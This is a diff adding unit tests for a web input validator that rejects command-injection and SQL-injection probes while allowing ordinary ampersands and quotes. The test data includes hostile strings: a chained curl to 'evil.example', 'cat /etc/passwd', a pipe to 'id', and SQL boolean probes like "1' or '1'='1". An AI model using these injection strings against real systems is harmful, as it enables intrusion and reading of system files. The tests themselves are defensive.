@@ -56,6 +56,28 @@ namespace DirectoryManager.Web.Tests.Security
         }
 
         [Theory]
+        [InlineData("Dog & Cat")]
+        [InlineData("Web & PHP hosting")]
+        [InlineData("\"monero\" or \"tor\"")]
+        [InlineData("/admin/reviews/all?status=Pending&type=x")]
+        [InlineData("/x?a=1&id=5&set=2")]
+        public void FindViolation_SearchesAndReturnUrls_WithAmpersandsOrQuotes_AreAllowed(string input)
+        {
+            Assert.Null(SuspiciousInputGuard.FindViolation(input));
+        }
+
+        [Theory]
+        [InlineData("x & curl http://evil.example/x")]
+        [InlineData("x && cat /etc/passwd")]
+        [InlineData("a | id")]
+        [InlineData("1' or '1'='1")]
+        [InlineData("\" or 1=1")]
+        public void FindViolation_CommandAndBooleanProbes_StillRejected(string input)
+        {
+            Assert.NotNull(SuspiciousInputGuard.FindViolation(input));
+        }
+
+        [Theory]
         [InlineData("monero")]
         [InlineData("vpn")]
         [InlineData("O'Reilly books")]
